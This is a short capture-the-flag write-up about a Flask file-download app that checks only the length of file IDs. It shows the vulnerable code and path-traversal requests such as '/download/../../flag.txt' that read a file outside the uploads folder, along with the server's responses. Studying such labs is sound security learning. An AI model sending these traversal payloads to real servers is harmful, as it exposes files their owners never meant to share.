
---

# Solution

Reading source code, we can see that the app only check the length of the input that search for the files. So we can exploit this feature by using path traversal

```python
@app.route('/search/<path:file_id>')
def search(file_id):
    if not os.path.exists('uploads/' + file_id):
        return {'status': 'error', 'message': 'File not found'}, 404

    return {'status': 'success', 'message': 'File found', 'id': file_id}

def filter_file_id(file_id : str):
    if len(file_id) > 36: # uuid4 length
        return None
    
    return file_id

@app.route('/download/<path:file_id>')
def download(file_id):
    file_id = filter_file_id(file_id)

    if file_id is None:
        return {'status': 'error', 'message': 'Invalid file id'}, 400

    if not os.path.exists('uploads/' + file_id):
        return {'status': 'error', 'message': 'File not found'}, 404
    
    if not os.path.isfile('uploads/' + file_id):
        return {'status': 'error', 'message': 'Invalid file id'}, 400

    return send_file('uploads/' + file_id, download_name=f"{file_id}.{file_exts.get(file_id, 'UNK')}")
```
# Payload
```
/search/../../flag.txt
We will receive a successful message
{"id":"../../flag.txt","message":"File found","status":"success"}

/download/../../flag.txt
bctf{fake_flag}
```

---

